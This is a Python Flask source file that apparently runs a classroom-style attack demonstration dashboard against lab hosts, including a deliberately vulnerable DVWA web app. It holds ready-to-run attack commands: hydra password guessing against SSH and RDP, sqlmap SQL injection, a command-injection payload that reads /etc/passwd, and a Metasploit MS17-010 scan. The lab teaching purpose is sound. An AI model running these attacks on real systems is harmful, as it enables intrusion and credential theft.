from flask import Flask, render_template, jsonify
import subprocess
import threading
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
import re

app = Flask(__name__)

# In-memory store for running/completed scenario results
results = {}

DVWA_BASE = "http://10.0.1.30/dvwa"
DVWA_USER = "admin"
DVWA_PASS = "CHANGE_ME"


def _extract_token(html, step):
    """Pull the CSRF user_token out of a DVWA page using a tolerant
    regex. If it can't be found, show the actual page body (past the
    static head/menu boilerplate, which looks identical on every DVWA
    page and told us nothing useful) so the real problem is visible."""
    m = re.search(r"user_token['\"]\s*value=['\"]([0-9a-fA-F]{32})['\"]", html)
    if m:
        return m.group(1)
    idx = html.find('id="main_body"')
    if idx == -1:
        idx = 0
    snippet = html[idx:idx + 350].replace("\n", " ").replace("\r", " ").strip()
    raise RuntimeError(f"Could not find CSRF token while: {step}. Body content: {snippet!r}")


def _check_dvwa_response(html, step):
    """Raise a clear, labelled error if DVWA reports a login/CSRF
    problem, instead of silently continuing and failing several steps
    later with a confusing 'token not found' error."""
    if "You have not logged in" in html:
        raise RuntimeError(f"DVWA session not authenticated while: {step}")
    if '<div class="message">' in html:
        msg = html.split('<div class="message">')[1].split("</div>")[0].strip()
        lower = msg.lower()
        if any(w in lower for w in ("incorrect", "failed", "invalid", "error")):
            raise RuntimeError(f"DVWA reported an error while {step}: {msg}")


def dvwa_session():
    """Log in to DVWA fresh and return an authenticated requests.Session
    with security set to low. Avoids the old problem of a hardcoded
    PHPSESSID going stale after a VM reboot or session timeout."""
    s = requests.Session()
    r = s.get(f"{DVWA_BASE}/login.php", timeout=10)
    token = _extract_token(r.text, "loading the login page")
    r = s.post(f"{DVWA_BASE}/login.php", data={
        "username": DVWA_USER,
        "password": DVWA_PASS,
        "Login": "Login",
        "user_token": token,
    }, timeout=10)
    _check_dvwa_response(r.text, "logging in")
    # DVWA's security page only honors a POST, not a GET query param,
    # and it needs its own fresh CSRF token to accept the change.
    r = s.get(f"{DVWA_BASE}/security.php", timeout=10)
    token = _extract_token(r.text, "loading the security page (login may have failed)")
    r = s.post(f"{DVWA_BASE}/security.php", data={
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token,
    }, timeout=10)
    _check_dvwa_response(r.text, "setting the security level")
    return s


def run_s4():
    """Website Database Attack (SQLi) - authenticate first, then hand
    sqlmap a fresh cookie instead of a hardcoded CHANGE_ME value."""
    s = dvwa_session()
    cookie_header = "; ".join(f"{k}={v}" for k, v in s.cookies.get_dict().items())
    proc = subprocess.run(
        ["sqlmap", "-u", f"{DVWA_BASE}/vulnerabilities/sqli/?id=1&Submit=Submit",
         f"--cookie={cookie_header}", "--dbs", "--batch", "--level=1", "--risk=1"],
        capture_output=True, text=True, timeout=180,
    )
    return proc.stdout + proc.stderr


def run_s6():
    """Command Smuggling (DVWA command injection) - fresh authenticated
    session fetched at run time instead of a stale hardcoded cookie.
    No CSRF token is sent: at Low security DVWA's exec form has no
    user_token field at all (that's the vulnerability being
    demonstrated - CSRF protection only appears at High/Impossible).
    Extracts just the relevant snippet from the response instead of
    returning the raw full-page HTML, which is unreadable in the
    small result box."""
    s = dvwa_session()
    r = s.post(f"{DVWA_BASE}/vulnerabilities/exec/", data={
        "ip": "127.0.0.1; cat /etc/passwd",
        "Submit": "Submit",
    }, timeout=15)
    if "<pre>" in r.text:
        return r.text.split("<pre>")[1].split("</pre>")[0].strip()
    if "CSRF token is incorrect" in r.text:
        return "DVWA rejected the request: CSRF token is incorrect"
    return "No command output found in response (unexpected page returned)."


def _one_burst_request():
    try:
        requests.get(f"{DVWA_BASE}/", timeout=5)
    except requests.RequestException:
        pass  # a dropped/failed request is fine - we just want the burst


def run_s7():
    """Bulk Data Grab Simulation - fires 30 concurrent requests with a
    hard per-request timeout so a stalled connection can never hang the
    whole scenario (the old bash 'curl ... & wait' loop could hang
    forever if even one backgrounded curl never returned)."""
    with ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(lambda _: _one_burst_request(), range(30)))
    return "Sent 30 rapid requests to 10.0.1.30/dvwa/"


def run_s8():
    """Shared Folder Weakness Check (SMB scan) - no sudo. The
    smb_ms17_010 scanner only needs a normal TCP connection to port 445,
    so it doesn't need root; running it under sudo from a Flask
    background thread has no tty to prompt for a password and just
    hangs until the timeout kills it."""
    proc = subprocess.run(
        ["msfconsole", "-q", "-x",
         "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.0.1.20; run; exit"],
        capture_output=True, text=True, timeout=180,
    )
    return proc.stdout + proc.stderr


SCENARIOS = {
    "s1": {
        "name": "Network Discovery Scan",
        "description": "Quietly checks which computers and services are visible on the network, the way a burglar might walk down a street checking which doors are unlocked.",
        "command": ["sudo", "nmap", "-sS", "-sV", "-O", "10.0.1.0/24"],
    },
    "s2": {
        "name": "Password Guessing (SSH)",
        "description": "Tries many common passwords against a login screen, one after another, to see if any of them work.",
        "command": ["hydra", "-l", "root", "-P", "/usr/share/wordlists/rockyou.txt",
                    "ssh://10.0.1.10", "-t", "4", "-f"],
    },
    "s3": {
        "name": "Password Guessing (Remote Desktop)",
        "description": "Same password-guessing idea as above, but aimed at a remote desktop login instead of a terminal login.",
        "command": ["hydra", "-l", "Administrator", "-P", "/usr/share/wordlists/rockyou.txt",
                    "rdp://10.0.1.20", "-t", "1"],
    },
    "s4": {
        "name": "Website Database Attack",
        "description": "Tricks a website's search box into revealing hidden information from its database.",
        "func": run_s4,
    },
    "s5": {
        "name": "Website Folder Snooping",
        "description": "Checks a website for hidden or forgotten folders and files that weren't meant to be found.",
        "command": ["nmap", "--script=http-enum", "-p", "80",
                    "--script-args", "http-enum.basepath=/dvwa/", "10.0.1.30"],
    },
    "s6": {
        "name": "Command Smuggling",
        "description": "Sneaks a hidden computer command inside a normal-looking web form field.",
        "func": run_s6,
    },
    "s7": {
        "name": "Bulk Data Grab Simulation",
        "description": "Fires off a burst of rapid requests to a server, similar to how someone copying large amounts of data quickly might behave.",
        "func": run_s7,
    },
    "s8": {
        "name": "Shared Folder Weakness Check",
        "description": "Checks whether a computer's shared-folder system has an old, well-known weakness that attackers have used before.",
        "func": run_s8,
    },
}


def run_scenario(scenario_id, key):
    try:
        scenario = SCENARIOS[key]
        if "func" in scenario:
            output = scenario["func"]()
        else:
            proc = subprocess.run(
                scenario["command"],
                capture_output=True, text=True, timeout=180,
            )
            output = proc.stdout + proc.stderr
    except Exception as e:
        output = f"Error running scenario: {e}"
    results[scenario_id] = {"status": "done", "output": output}


@app.route("/")
def index():
    return render_template("index.html", scenarios=SCENARIOS)


@app.route("/run/<key>", methods=["POST"])
def run(key):
    if key not in SCENARIOS:
        return jsonify({"error": "unknown scenario"}), 404
    scenario_id = str(uuid.uuid4())
    results[scenario_id] = {"status": "running", "output": ""}
    thread = threading.Thread(target=run_scenario, args=(scenario_id, key))
    thread.start()
    return jsonify({"id": scenario_id})


@app.route("/result/<scenario_id>")
def result(scenario_id):
    r = results.get(scenario_id)
    if not r:
        return jsonify({"status": "unknown", "output": ""})
    return jsonify(r)


if __name__ == "__main__":
    app.run(host="10.0.2.10", port=5000, debug=False)
